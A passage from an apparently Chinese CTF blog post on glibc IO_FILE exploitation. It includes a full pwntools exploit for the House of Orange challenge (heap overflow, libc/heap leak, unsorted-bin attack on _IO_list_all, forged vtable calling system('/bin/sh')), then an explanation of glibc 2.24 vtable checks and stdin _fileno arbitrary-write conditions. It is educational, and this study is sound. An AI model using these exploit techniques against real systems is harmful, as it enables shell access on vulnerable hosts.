class="number">&#x27;f</span><span class="number">&#x27;</span>, <span class="number">233</span>, <span class="number">0xDDAA</span>) # chunk1</span><br><span class="line">    <span class="meta">#debug()</span></span><br><span class="line">    <span class="built_in">build</span>(<span class="number">0x400</span>, b<span class="number">&#x27;f</span><span class="number">&#x27;</span>*<span class="number">8</span>, <span class="number">666</span>, <span class="number">2</span>) # chunk2</span><br><span class="line">    <span class="built_in">debug</span>()</span><br><span class="line">    io.<span class="built_in">sendlineafter</span>(b<span class="string">&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>).<span class="built_in">encode</span>())</span><br><span class="line">    io.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;f</span><span class="number">&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    libc.address = <span class="built_in">u64</span>(io.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;</span>\x7f<span class="number">&#x27;</span>).<span class="built_in">ljust</span>(<span class="number">8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)) - <span class="number">0x3c5188</span></span><br><span class="line">    <span class="built_in">lk</span>(<span class="string">&#x27;libc base address&#x27;</span>, libc.address)</span><br><span class="line">    _IO_list_all = libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    <span class="built_in">lk</span>(<span class="string">&#x27;_IO_list_all&#x27;</span>, _IO_list_all)</span><br><span class="line">    <span class="built_in">lk</span>(<span class="string">&#x27;system_addr&#x27;</span>, system_addr)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">upgrade</span>(<span class="number">0x10</span>, b<span class="number">&#x27;f</span><span class="number">&#x27;</span>*<span class="number">0x10</span>, <span class="number">666</span>, <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">debug</span>()</span><br><span class="line">    io.<span class="built_in">sendlineafter</span>(b<span class="string">&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>).<span class="built_in">encode</span>())</span><br><span class="line">    io.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;f</span><span class="number">&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    heap_addr = <span class="built_in">u64</span>(io.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;</span>\n<span class="number">&#x27;</span>, drop=True).<span class="built_in">ljust</span>(<span class="number">8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">    heap_base = heap_addr - <span class="number">0xE0</span></span><br><span class="line">    <span class="built_in">lk</span>(<span class="string">&#x27;heap_base&#x27;</span>, heap_base)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019174459330.png"
                      alt="image-20231019174459330"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019174527488.png"
                      alt="image-20231019174527488"
                ></p>
<p>首先通过堆溢出将 <code>top_chunk</code> 的大小改为 <code>0xf81</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019174746698.png"
                      alt="image-20231019174746698"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019175547709.png"
                      alt="image-20231019175547709"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019181025042.png"
                      alt="image-20231019181025042"
                ></p>
<p>然后申请一块大于 <code>0xf81</code> 的 <code>chunk</code> 利用上面讲的 <code>sysmalloc</code> 中的 <code>_int_free</code> 函数将 <code>old_top_chunk</code> 放入 <code>unsorted_bin</code> 中。在申请 <code>0x400</code> 大小的 <code>large_chunk</code> ，<code>ptmalloc2</code> 会先将 <code>old_top_chunk</code> 放进 <code>large_bin</code>，然后切分 <code>old_top_chunk</code>，再将其放回 <code>unsorted_bin</code>。 所以此时其 <code>fd_nextsize</code> 和 <code>bk_nextsize</code> 遗留了 <code>heap</code> 地址。其 <code>bk</code> 位置遗留了 <code>main_arean+0x668</code> 的地址。我们可以通过 <code>0x400</code> 这个堆块泄露出 <code>heap</code> 和 <code>libc</code> 地址，然后通过计算偏移获得基址。</p>
<p><strong>FSOP</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">FSOP</span>():</span><br><span class="line">    orange = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x61</span>) + p64(<span class="number">0</span>) + p64(_IO_list_all - <span class="number">0x10</span>) <span class="comment"># unsorted_bin_attack</span></span><br><span class="line">    orange += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">    orange = orange.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    orange += p64(<span class="number">0</span>) * <span class="number">3</span> + p64(heap_base + <span class="number">0x5E8</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(system_addr)</span><br><span class="line"></span><br><span class="line">    payload = cyclic(<span class="number">0x400</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p32(<span class="number">233</span>) + p32(<span class="number">0xDDAA</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += orange</span><br><span class="line">    upgrade(<span class="built_in">len</span>(payload), payload, <span class="number">233</span>, <span class="number">0xDDAA</span>)</span><br><span class="line">    debug()</span><br><span class="line"></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice : &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">    pause()</span><br></pre></td></tr></table></figure></div>

<p>我们可以通过 <code>unsorted_bin_attack</code> 将 <code>_IO_list_all</code> 指向 <code>main_arena+0x58</code> ，但这块区域是我们不可控的，我们看一下 <code>malloc_state</code> 结构体源码:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_state</span></span><br><span class="line">&#123;</span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line">  <span class="comment">/* int have_fastchunks; glibc 2.23 无此成员 */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">  mchunkptr top;</span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next_free;</span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><em>(tips:bins[2*N - 2] 和 bins[2 * N - 1]分别对应链表头和链表尾指针)</em></p>
<p><code>bins[11] == small_bin[5] == small_bin_0x60 </code> ，<code>bins[0] == unsorted_bin</code>，相差是 <code>12*8 = 0x60</code>。结合 <code>_IO_FILE_plus</code> 结构体如下图所示:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/hosa_fake_io.png"
                      alt="hosa_fake_io"
                ></p>
<p>我们可以控制 <code>old_top_chunk</code> 的大小，把它 <code>size</code> 置为 <code>0x61</code>，并在其内部构建 <code>fake_IO_FILE_plus_2</code> 放进 <code>small_bin[5]</code>，那么<code>fp-&gt;_chain</code> 将会指向 <code>fake_IO_FILE_2</code>。此时 <code>main_arena</code> 如下图。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019195436804.png"
                      alt="image-20231019195436804"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019200506509.png"
                      alt="image-20231019200506509"
                ></p>
<p>为了绕过如下检查:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)) </span><br><span class="line">    &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure></div>

<p>我们构造的 <code>fake_IO_FILE_plus</code> 如下图:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/hosafioplus.png"
                      alt="hosafioplus"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019200603105.png"
                      alt="image-20231019200603105"
                ></p>
<p>检测到内存错误后的调用 <code>_IO_OVERFLOW (fp, EOF)-&gt;_IO_OVERFLOW(&quot;/bin/sh\x00, EOF&quot;)-&gt;system(&quot;/bin/sh\x00&quot;)</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231019201736567.png"
                      alt="image-20231019201736567"
                ></p>
<p><strong>完整exp</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">lk = <span class="keyword">lambda</span> addrstring, address: log.info(<span class="string">&#x27;&#123;&#125;: %#x&#x27;</span>.<span class="built_in">format</span>(addrstring), address)</span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">True</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">global</span> io, elf, libc</span><br><span class="line">    elf = ELF(<span class="string">&quot;./houseoforange&quot;</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> is_local:</span><br><span class="line">        io = process(<span class="string">&#x27;./houseoforange&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&#x27;192.168.152.138&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="literal">True</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">gdbscript=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> is_debug:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">length, name, price, color</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Length of name :&quot;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Name :&quot;</span>, name)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Price of Orange:&quot;</span>, <span class="built_in">str</span>(price).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Color of Orange:&quot;</span>, <span class="built_in">str</span>(color).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upgrade</span>(<span class="params">length, name, price, color</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Length of name :&quot;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Name:&quot;</span>, name)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Price of Orange: &quot;</span>, <span class="built_in">str</span>(price).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Color of Orange:&quot;</span>, <span class="built_in">str</span>(color).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>():</span><br><span class="line">    <span class="keyword">global</span> malloc_hook, _IO_list_all, system_addr, heap_base</span><br><span class="line">    build(<span class="number">0x30</span>, <span class="string">b&#x27;ffff&#x27;</span>, <span class="number">233</span>, <span class="number">0xDDAA</span>) <span class="comment"># chunk0</span></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    payload = cyclic(<span class="number">0x30</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p32(<span class="number">233</span>) + p32(<span class="number">0xDDAA</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0xf81</span>)</span><br><span class="line">    upgrade(<span class="built_in">len</span>(payload), payload, <span class="number">233</span>, <span class="number">0xDDAA</span>) <span class="comment"># size must be page aligned</span></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    build(<span class="number">0x1000</span>, <span class="string">b&#x27;f&#x27;</span>, <span class="number">233</span>, <span class="number">0xDDAA</span>) <span class="comment"># chunk1</span></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    build(<span class="number">0x400</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>, <span class="number">666</span>, <span class="number">2</span>) <span class="comment"># chunk2</span></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    libc.address = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3c5188</span></span><br><span class="line">    lk(<span class="string">&#x27;libc base address&#x27;</span>, libc.address)</span><br><span class="line">    _IO_list_all = libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    lk(<span class="string">&#x27;_IO_list_all&#x27;</span>, _IO_list_all)</span><br><span class="line">    lk(<span class="string">&#x27;system_addr&#x27;</span>, system_addr)</span><br><span class="line"></span><br><span class="line">    upgrade(<span class="number">0x10</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>, <span class="number">666</span>, <span class="number">2</span>)</span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    heap_addr = u64(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    heap_base = heap_addr - <span class="number">0xE0</span></span><br><span class="line">    lk(<span class="string">&#x27;heap_base&#x27;</span>, heap_base)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FSOP</span>():</span><br><span class="line">    orange = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x61</span>) + p64(<span class="number">0</span>) + p64(_IO_list_all - <span class="number">0x10</span>) <span class="comment"># unsorted_bin_attack</span></span><br><span class="line">    orange += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment"># fp-&gt;_mode &lt;= 0;fp-&gt;_IO_write_ptr&gt;fp-&gt;_IO_write_base</span></span><br><span class="line">    orange = orange.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    orange += p64(<span class="number">0</span>) * <span class="number">3</span> + p64(heap_base + <span class="number">0x5E8</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(system_addr)</span><br><span class="line"></span><br><span class="line">    payload = cyclic(<span class="number">0x400</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p32(<span class="number">233</span>) + p32(<span class="number">0xDDAA</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += orange</span><br><span class="line">    upgrade(<span class="built_in">len</span>(payload), payload, <span class="number">233</span>, <span class="number">0xDDAA</span>)</span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice : &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    connect()</span><br><span class="line">    leak()</span><br><span class="line">    FSOP()</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure></div>

<h1 id="IO-vtable-check-检查及新的利用方法"><a href="#IO-vtable-check-检查及新的利用方法" class="headerlink" title="_IO_vtable_check 检查及新的利用方法"></a>_IO_vtable_check 检查及新的利用方法</h1><h2 id="glibc-2-24-加入的检查"><a href="#glibc-2-24-加入的检查" class="headerlink" title="glibc-2.24 加入的检查"></a>glibc-2.24 加入的检查</h2><p><code>glibc-2.24</code> 后加入了针对 <code>IO_FILE_plus</code> 的 <code>vtable</code> 劫持的检测措施，<code>glibc</code>  会在调用虚函数之前首先检查 <code>vtable</code> 地址的是否合法。首先会验证 <code>vtable</code> 是否位于<code>_IO_vtable</code>  段中，如果满足条件就正常执行，否则会调用 <code>_IO_vtable_check</code> 做进一步检查。如果 <code>vtable</code> 是非法的，那么会引发 <code>abort</code>。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span></span><br><span class="line"><span class="meta">  (IO_validate_vtable                                                   \</span></span><br><span class="line"><span class="meta">   (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS)   \</span></span><br><span class="line"><span class="meta">                 + (THIS)-&gt;_vtable_offset)))</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">IO_validate_vtable</span> (<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 计算 _IO_vtable 长度</span></span><br><span class="line">    <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">    <span class="comment">// 计算 ptr 与 __start___libc_IO_vtables 距离</span></span><br><span class="line">    <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">    <span class="comment">// 如果即不在 _IO_vtable_段内, 则调用 _IO_vtable_check ()</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">        _IO_vtable_check ();</span><br><span class="line">    <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="built_in">void</span> (*flag) (<span class="type">void</span>) = <span class="built_in">atomic_load_relaxed</span> (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (flag);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">link_map</span> *l;</span><br><span class="line">    <span class="keyword">if</span> (_dl_open_hook != <span class="literal">NULL</span></span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol>
<li>判断 <code>vtable</code> 的地址是否处于 <code>glibc</code> 中的 <code>vtable</code> 数组段，是的话，通过检查。</li>
<li>否则判断是否为外部的合法 <code>vtable</code>（重构或是动态链接库中的vtable），是的话，通过检查。</li>
<li>否则报错，输出<code>Fatal error: glibc detected an invalid stdio handle</code>，程序退出。</li>
</ol>
<h2 id="fileno-相关利用"><a href="#fileno-相关利用" class="headerlink" title="_fileno 相关利用"></a>_fileno 相关利用</h2><p><code>_IO_FILE</code> 在使用标准 <code>IO</code> 库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用 <code>fwrite</code>、<code>fread</code> 等函数时写入地址或读取地址的，如果可以控制这些数据就可以实现任意地址写或任意地址读。进程中包含了系统默认的三个文件流 <code>stdin,stdout,stderr</code>，因此这种方式可以不需要进程中存在文件操作，通过 <code>scanf,printf </code>一样可以进行利用。</p>
<ul>
<li><code>fp-&gt;_fileno</code> 的值就是文件描述符，<code>stderr</code> 值为 <code>2</code>，<code>stdout</code> 值为 <code>1</code>，<code>stdin</code> 值为 <code>0</code>。</li>
<li><code>fp-&gt;_IO_buf_base</code> 表示操作的起始地址</li>
<li><code>fp-&gt;_IO_buf_end</code> 表示结束地址</li>
</ul>
<p><strong>stdin 任意写</strong></p>
<p>大致了解 <code>fread</code> 的执行流程后，还需要绕过以下检查:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_file_xsgetn (_IO_FILE *fp, <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="comment">/* fp-&gt;_IO_buf_base == NULL 会调用 _IO_doallocbuf (fp) 初始化缓冲区 */</span></span><br><span class="line">  	<span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">        <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	    	<span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	   		fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	    &#125;</span><br><span class="line">        _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 如果 fp-&gt;_IO_read_end &gt; fp-&gt;_IO_read_ptr 则会将缓冲区内容复制到目标地址 */</span></span><br><span class="line">	...</span><br><span class="line">    have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">	    want -= have;</span><br><span class="line">	    fp-&gt;_IO_read_ptr += have;</span><br><span class="line">	 &#125;</span><br><span class="line">     ...</span><br><span class="line">     <span class="comment">/* 如果输入长度大于缓冲区大小则会直接读入 */</span></span><br><span class="line">	 <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">	 &#123;</span><br><span class="line">	 	<span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	 &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>即:</p>
<ul>
<li>设置<code>_IO_read_end</code>等于<code>_IO_read_ptr</code>。</li>
<li>设置 <code>_flag &amp;~ _IO_NO_READS</code> 即<code> _flag &amp;~ 0x4</code>。</li>
<li>设置 <code>_fileno</code> 为 <code>0</code> ，表示读入数据的来源是 <code>stdin</code> 。</li>
<li>设置<code> _IO_buf_base</code> 为 <code>write_start</code> ，<code>_IO_buf_end</code> 为 <code>write_end</code> ；</li>
<li>使得 <code>_IO_buf_end - _IO_buf_base</code> 大于 <code>fread</code> 要读的数据。</li>
</ul>
<p><strong>示例</strong></p>
